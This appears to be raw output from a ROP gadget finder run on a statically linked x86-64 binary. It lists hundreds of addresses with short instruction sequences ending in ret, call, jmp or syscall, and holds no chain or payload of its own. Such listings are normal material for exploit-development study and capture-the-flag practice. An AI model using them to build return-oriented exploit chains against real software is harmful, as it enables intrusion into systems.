0x0000000000411b14 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x00000000004601f4 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000041c19d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000048e0bd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000046a695 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000040fc7b : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xf748
0x0000000000415146 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x000000000044bd42 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf
0x000000000045e4f9 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x8948
0x000000000042ab28 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x9066
0x0000000000456a07 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0xb60f
0x000000000043d974 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0xf66
0x000000000043f4ea : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0xf9c5
0x000000000048ccdd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x000000000048abd4 : add byte ptr [rax], al ; add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x000000000040603d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000446f4d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x000000000040f37d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000485a3d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x000000000047dd08 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000042b933 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000048e09d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x0000000000472cae : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000043f291 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b95d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042664d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x00000000004896a0 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000435074 : add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000412578 : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00000000004af4ce : add byte ptr [rax], al ; add byte ptr [rax - 9], bl ; jmp qword ptr [rbx]
0x00000000004107db : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, ch ; retf
0x000000000040eb7b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004859bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x0000000000418f5b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000413a9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000471cfb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; retf 0x8d4c
0x000000000045d56b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x000000000044a1ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x0000000000418f9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000044c93b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jo 0x44c96d ; ret
0x000000000041c19b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000048e0bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000048ccdb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x000000000040603b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000446f4b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x000000000040f37b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000048e09b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x0000000000417b86 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a0292 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00000000004a0782 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x000000000049f942 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf
0x00000000004a02d2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x24
0x00000000004a07c2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x33
0x000000000049f93a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; retf 1
0x00000000004198fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000044718b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x000000000042699b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00000000004252ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000045a24b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x42], cl ; retf 0x4a8d
0x000000000041351b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000041a69b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x0000000000422fcb : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x4804
0x000000000044ae8b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x000000000047497c : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, 3 ; ret
0x0000000000481bcf : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000040eb7c : add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x000000000041a60c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00000000004859bc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x00000000004a22bc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00000000004a146c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x0000000000448a07 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x000000000048d2a4 : add byte ptr [rax], al ; add byte ptr [rax], al ; je 0x48d28c ; ret
0x0000000000485c86 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x485c54
0x000000000046002d : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x00000000004456ac : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xa] ; ret
0x00000000004456bc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xb] ; ret
0x00000000004456cc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xc] ; ret
0x00000000004456dc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xd] ; ret
0x00000000004456ec : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xe] ; ret
0x000000000044562c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 1] ; ret
0x000000000044563c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 2] ; ret
0x000000000044564c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 3] ; ret
0x000000000044565c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 4] ; ret
0x000000000044566c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 5] ; ret
0x000000000044567c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 6] ; ret
0x000000000044568c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 8] ; ret
0x000000000044569c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 9] ; ret
0x000000000044561c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x0000000000400cad : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000044507c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x0000000000444a5c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00000000004886ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x26 ; syscall
0x000000000047568c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x68 ; syscall
0x000000000047567c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x6b ; syscall
0x000000000047569c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x6c ; syscall
0x000000000044aeec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xb ; syscall
0x0000000000418f1c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x0000000000484609 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000044a2ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; syscall
0x0000000000484812 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x000000000044992c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edi, edx ; mov eax, esi ; syscall
0x000000000043605c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000044c93c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rax + 0x20], rsi ; ret
0x0000000000481bdc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x0000000000418f8c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x0000000000418f9c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000048105c : add byte ptr [rax], al ; add byte ptr [rax], al ; movsx eax, dl ; sub eax, ecx ; ret
0x000000000041351c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x0000000000448a4c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x00000000004361ac : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00000000004198fc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004120dc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000417b88 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a128c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00000000004a1a24 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x00000000004a0294 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00000000004a0784 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x000000000049f944 : add byte ptr [rax], al ; add byte ptr [rax], al ; retf
0x00000000004a12c4 : add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x1d4
0x00000000004a1a64 : add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x1d5
0x00000000004a02d4 : add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x24
0x00000000004a07c4 : add byte ptr [rax], al ; add byte ptr [rax], al ; retf 0x33
0x000000000049f93c : add byte ptr [rax], al ; add byte ptr [rax], al ; retf 1
0x0000000000400407 : add byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x40041b ; call rax
0x000000000042c18c : add byte ptr [rax], al ; add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x0000000000417e9c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000044a1dc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; syscall
0x00000000004737dc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x000000000044545c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x0000000000480f9c : add byte ptr [rax], al ; add byte ptr [rax], bh ; retf 0x850f
0x0000000000449ec4 : add byte ptr [rax], al ; add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000048513d : add byte ptr [rax], al ; add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x000000000048e1b1 : add byte ptr [rax], al ; add byte ptr [rbp + 0x1a], dh ; ret
0x00000000004759fb : add byte ptr [rax], al ; add byte ptr [rbp + 0x1b], dh ; add rsp, 0x38 ; ret
0x0000000000481f62 : add byte ptr [rax], al ; add byte ptr [rbp + 0x27], dh ; add rsp, 0x68 ; ret
0x0000000000481ea2 : add byte ptr [rax], al ; add byte ptr [rbp + 0x2c], dh ; add rsp, 0x38 ; ret
0x00000000004581f5 : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00000000004820c3 : add byte ptr [rax], al ; add byte ptr [rbp + 0x36], dh ; add rsp, 0x78 ; ret
0x00000000004843ce : add byte ptr [rax], al ; add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000044afdd : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x000000000044a0f4 : add byte ptr [rax], al ; add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x00000000004758c9 : add byte ptr [rax], al ; add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x000000000044a484 : add byte ptr [rax], al ; add byte ptr [rbp + 0x4a], dh ; add rsp, 0x68 ; ret
0x000000000044adf3 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x0000000000488498 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x000000000045b56c : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000048505a : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x000000000048d2e6 : add byte ptr [rax], al ; add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x000000000041f8d9 : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x46], cl ; dec dword ptr [rax - 0x77] ; ret 0x2948
0x000000000044c578 : add byte ptr [rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x000000000042b8e8 : add byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000458429 : add byte ptr [rax], al ; add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x000000000043593d : add byte ptr [rax], al ; add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x00000000004b545a : add byte ptr [rax], al ; add byte ptr [rbx + 0x57f00000], bl ; std ; call qword ptr [rdx]
0x0000000000414af2 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000417aa4 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000410599 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x000000000048d2a5 : add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x000000000045cddc : add byte ptr [rax], al ; add byte ptr [rbx + rcx*4 + 0x2d], cl ; retf 0x25f1
0x000000000046d02d : add byte ptr [rax], al ; add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x000000000046603a : add byte ptr [rax], al ; add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00000000004ac45a : add byte ptr [rax], al ; add byte ptr [rbx], cl ; add byte ptr [rax], al ; sub byte ptr [rdx], 0xf6 ; call qword ptr [rax]
0x00000000004b318e : add byte ptr [rax], al ; add byte ptr [rbx], dl ; cld ; jmp qword ptr [rax]
0x00000000004604ab : add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; retf 0x8944
0x0000000000411e04 : add byte ptr [rax], al ; add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x0000000000460b17 : add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x000000000046c8f8 : add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x0000000000469606 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x46 ; or al, 0x83 ; ret
0x000000000046d892 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; ret 0x3941
0x000000000044718d : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x000000000040e203 : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret 0x149
0x000000000049218d : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x0000000000473bbd : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x00000000004918ed : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000042475d : add byte ptr [rax], al ; add byte ptr [rcx + rcx*8 - 0x7cb7dd8c], al ; ret 0x4801
0x000000000044bc28 : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x44bc37 ; call r12
0x000000000044bc58 : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x44bc67 ; call r12
0x0000000000472860 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; out 0xf7, al ; fucomi st(0) ; ret
0x0000000000458e99 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; push rsi ; cmp byte ptr [rax - 0x3f], cl ; retf 0x6411
0x000000000045f411 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x00000000004048ce : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x0000000000479e12 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000041d735 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000042699d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00000000004252ad : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000042c360 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 1
0x000000000042c386 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 2
0x000000000044aea3 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; inc dword ptr [rcx - 0x7d] ; retf 0x8940
0x000000000040ed92 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000042bc6a : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x000000000048d013 : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call r14
0x000000000048d03b : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call rax
0x000000000048dd8a : add byte ptr [rax], al ; add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x000000000045a24d : add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x42], cl ; retf 0x4a8d
0x0000000000463473 : add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x4a], al ; or al, 0x89 ; ret 0xc689
0x000000000040dc84 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x8944c689 ; ret 0xeab8
0x0000000000481144 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x940fc085 ; ret 0x3d
0x0000000000448995 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000043613d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x00000000004361ad : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x0000000000454b99 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x4e ; add dword ptr [rcx - 0x77], eax ; retf
0x0000000000448a4d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x000000000041351d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000042bcad : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x0000000000459199 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc083
0x00000000004656d1 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; retf 0x45e9
0x0000000000476930 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xc283
0x000000000048d215 : add byte ptr [rax], al ; add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x0000000000485370 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rax], al ; retf 0xf66
0x000000000042ce42 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041a69d : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x000000000042bbd2 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x0000000000455d13 : add byte ptr [rax], al ; add cl, ch ; ret
0x000000000045ee38 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x00000000004554c6 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffd
0x0000000000423c34 : add byte ptr [rax], al ; add cl, ch ; retf
0x00000000004851e2 : add byte ptr [rax], al ; add cl, ch ; retf 0xfff7
0x000000000048ac1e : add byte ptr [rax], al ; add cl, ch ; retf 0xfffe
0x0000000000400cae : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000046a116 : add byte ptr [rax], al ; add dh, al ; test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x000000000045e940 : add byte ptr [rax], al ; add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000045191c : add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x0000000000422fcd : add byte ptr [rax], al ; add dh, dh ; ret 0x4804
0x000000000044ae8d : add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x00000000004468e1 : add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x000000000047497e : add byte ptr [rax], al ; add rax, 3 ; ret
0x000000000042ba83 : add byte ptr [rax], al ; add rax, rdi ; add rax, rcx ; ret
0x00000000004121a2 : add byte ptr [rax], al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000048d250 : add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x000000000048499c : add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x000000000048ad13 : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000416a1b : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000449fe9 : add byte ptr [rax], al ; add rsp, 0x68 ; ret
0x000000000044a37c : add byte ptr [rax], al ; add rsp, 0x78 ; ret
0x00000000004015fc : add byte ptr [rax], al ; add rsp, 0x98 ; ret
0x000000000044bb1e : add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040dd0e : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004b16ba : add byte ptr [rax], al ; and al, 0x79 ; cli ; call qword ptr [rdx]
0x00000000004b3e7a : add byte ptr [rax], al ; and byte ptr [rbp - 0x39360000], al ; hlt ; jmp qword ptr [rcx]
0x00000000004afc7a : add byte ptr [rax], al ; and byte ptr [rbx], al ; add al, dh ; mov ecx, edi ; call qword ptr [rbx]
0x00000000004b2fee : add byte ptr [rax], al ; and byte ptr [rdx], cl ; cld ; jmp qword ptr [rax]
0x0000000000448a96 : add byte ptr [rax], al ; and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x000000000042bcae : add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x00000000004412d0 : add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000473384 : add byte ptr [rax], al ; bsr rax, rax ; add rax, rdi ; ret
0x00000000004b0f56 : add byte ptr [rax], al ; call 0x114b0966
0x00000000004b07c6 : add byte ptr [rax], al ; call 0x134b0191
0x00000000004ade26 : add byte ptr [rax], al ; call 0x174ad4ea
0x00000000004138be : add byte ptr [rax], al ; call 0x4131b8
0x000000000046fbfa : add byte ptr [rax], al ; call 0x44c694
0x00000000004103e6 : add byte ptr [rax], al ; call 0x44c6c4
0x00000000004b1a42 : add byte ptr [rax], al ; call 0x784b1ab2
0x000000000040111c : add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x000000000040eb7e : add byte ptr [rax], al ; call qword ptr [rbx]
0x000000000048d019 : add byte ptr [rax], al ; call r14
0x000000000040ea8b : add byte ptr [rax], al ; call rax
0x00000000004859be : add byte ptr [rax], al ; call rbx
0x00000000004a22be : add byte ptr [rax], al ; call rdi
0x000000000040e9c5 : add byte ptr [rax], al ; call rdx
0x00000000004a146e : add byte ptr [rax], al ; call rsp
0x00000000004b2df6 : add byte ptr [rax], al ; clc ; cli ; sti ; jmp qword ptr [rbx]
0x00000000004abf06 : add byte ptr [rax], al ; clc ; cwde ; cmc ; call rax
0x0000000000448b14 : add byte ptr [rax], al ; clc ; jg 0x448b18 ; int1 ; mov eax, eax ; ret
0x00000000004b0f52 : add byte ptr [rax], al ; clc ; push rbp ; add byte ptr [rax], al ; call 0x114b096a
0x00000000004b0456 : add byte ptr [rax], al ; cld ; add byte ptr [rax], al ; je 0x4b0413 ; stc ; call rsi
0x0000000000448a41 : add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x0000000000448a09 : add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x0000000000424cec : add byte ptr [rax], al ; cmove rax, rdx ; ret
0x00000000004240e3 : add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00000000004af9c6 : add byte ptr [rax], al ; cmp byte ptr [rbp - 7], cl ; jmp qword ptr [rbx]
0x00000000004b0a92 : add byte ptr [rax], al ; cmp byte ptr [rcx], dl ; add byte ptr [rax], ch ; loopne 0x4b0a9d ; call qword ptr [rax]
0x00000000004b3406 : add byte ptr [rax], al ; cmp byte ptr [rdx], ah ; cld ; jmp qword ptr [rcx]
0x000000000047fa3c : add byte ptr [rax], al ; cmp rax, -1 ; cmove rax, rdx ; ret
0x000000000041ff57 : add byte ptr [rax], al ; cmp rdx, r8 ; jne 0x41ff28 ; ret
0x00000000004b5d56 : add byte ptr [rax], al ; cwde ; cwde ; std ; call qword ptr [rdx]
0x00000000004b2df2 : add byte ptr [rax], al ; cwde ; je 0x4b2e00 ; add al, bh ; cli ; sti ; jmp qword ptr [rbx]
0x000000000049e41a : add byte ptr [rax], al ; enter 0, 0 ; retf
0x00000000004a246e : add byte ptr [rax], al ; enter 0, 0 ; retf 0
0x000000000049f5c6 : add byte ptr [rax], al ; enter 0x10, 0 ; retf
0x00000000004ade22 : add byte ptr [rax], al ; enter 0x24, 0 ; call 0x174ad4ee
0x000000000049edc6 : add byte ptr [rax], al ; enter 0xa, 0 ; retf
0x000000000049f1c6 : add byte ptr [rax], al ; enter 0xd, 0 ; retf
0x00000000004a266e : add byte ptr [rax], al ; enter 1, 0 ; retf 1
0x00000000004a286e : add byte ptr [rax], al ; enter 2, 0 ; retf 2
0x00000000004a2a6e : add byte ptr [rax], al ; enter 3, 0 ; retf 3
